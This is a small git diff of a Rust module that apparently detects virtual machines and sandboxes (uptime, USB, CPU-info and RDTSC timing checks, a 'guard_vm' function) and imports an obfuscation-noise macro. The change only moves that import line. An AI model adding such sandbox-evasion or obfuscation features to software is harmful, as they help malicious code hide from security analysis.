@@ -19,7 +19,6 @@ mod c_drive;
 #[cfg(feature = "vm_check_uptime")]
 mod uptime;
 
-use rsl_macros::obfuscation_noise_macro;
 #[cfg(feature = "vm_check_usb_mount")]
 mod usb_mount;
 #[cfg(feature = "vm_check_cpu_info")]
@@ -29,6 +28,8 @@ mod rdtsc_timing;
 
 #[cfg(feature = "debug")]
 use crate::utils::print_message;
+
+use rsl_macros::obfuscation_noise_macro;
 
 #[cfg(feature = "sandbox")]
 pub fn guard_vm() -> bool {
